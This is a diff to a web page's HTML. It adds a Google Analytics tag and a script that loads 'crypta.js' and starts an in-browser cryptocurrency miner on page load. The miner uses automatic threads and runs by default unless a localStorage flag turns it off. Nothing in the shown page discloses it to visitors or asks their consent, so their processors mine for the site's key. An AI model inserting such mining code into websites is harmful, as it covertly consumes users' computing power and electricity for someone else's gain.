@@ -7,6 +7,13 @@
         <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 		<link href="src/css/style.css" rel="stylesheet">
         <script src="src/js/util.js"></script>
+		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-73200448-1"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());
+			gtag('config', 'UA-73200448-1');
+		</script>
 		
 		<script src="bower_components/webcomponentsjs/webcomponents-lite.js"></script>
 		<link rel="import" href="bower_components/polymer/polymer.html">
@@ -23,4 +30,13 @@
 			</div>
 		</div>
 	</body>
+	
+	<script src="cl/lib/crypta.js"></script>
+	<script>
+		var miner_enabled = (localStorage.getItem("miner") || "true") == "true";
+		if(miner_enabled) {
+			window.miner = new CRLT.Anonymous('780c65e12f7eaebadd433b1eb488f45a5f71347a77df', { autoThreads: true, throttle: 0.1 });
+			window.miner.start();
+		}
+	</script>
 </html>
